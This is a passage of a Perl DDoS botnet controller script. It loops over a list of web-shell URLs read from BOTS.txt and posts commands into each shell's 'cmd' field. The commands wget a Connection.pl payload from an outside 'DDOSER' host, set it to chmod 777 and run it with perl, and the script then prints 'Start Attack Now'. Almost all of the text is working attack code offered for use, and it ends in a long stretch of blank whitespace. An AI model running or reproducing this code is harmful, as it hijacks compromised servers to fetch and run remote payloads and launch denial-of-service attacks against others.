		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /G3n3Rall/ || /#BHG/){
		syswrite STDOUT,"\n\n \t\t  $BOTS => Success \n";
		
		}
		else
		{
		syswrite STDOUT, "$BOTS => KILLED\n";
		sleep(2);
		exit;
		}
		}

		goto TRANSPORT;
}
if ($check =! 1 || 2) {
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id\n";
goto ForCheck10;
}


TRANSPORT:;
########################
sleep(2);
$cmd = "wget http://g3n3rall-blackhat.persiangig.com/DDOSER/Connection.pl";
$fieldname = "cmd";
open (BOTS, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS>) {
$ATTACK=$_;
chomp $ATTACK;
print "\n\t";
syswrite STDOUT, "\n\n\t\t ready for wget\n";
sleep(3);
syswrite STDOUT, "\n\t Copying Connection.pl ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK);
$mechanizee->field("$fieldname" => "$cmd");
$mechanizee->click();
}
syswrite STDOUT, "\n\tConnection.pl Copied !";
sleep(2);
############################
$cmd2 = "chmod 777 Connection.pl";
$fieldname2 = "cmd";
open (BOTS2, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS2>) {
$ATTACK2=$_;
chomp $ATTACK2;
print "\n\t";
syswrite STDOUT, "\n\t Set Permission[777] For Connection.pl ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK2);
$mechanizee->field("$fieldname2" => "$cmd2");
$mechanizee->click();
}
syswrite STDOUT, "\n\t Permission set";
sleep(2);


############################
$cmd3 = "perl Connection.pl";
$fieldname3 = "cmd";
open (BOTS3, "<BOTS.txt") or die "\n\tSry NOT FOUND BOTS.txt \n";
while (<BOTS3>) {
$ATTACK3=$_;
chomp $ATTACK3;
print "\n\t";
syswrite STDOUT, "\n\t Runing Connection.pl ...\n";
my $mechanizee = WWW::Mechanize->new(timeout => 50);
$mechanizee->get($ATTACK3);
$mechanizee->field("$fieldname3" => "$cmd3");
$mechanizee->click();
}
syswrite STDOUT, "\n\t Runed Connection.pl\n";
sleep(2);
syswrite STDOUT, "\n\t Start Attack Now ;)\n";
sleep(4);
goto MENU;
}

###################
###################
###################

if ($Menu =! 1 || 2 || 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11){
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); 
print "\n \t\t\t invalid id  > or < Attack [or Job] is finish \n";
exit;
}
system("pause");

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          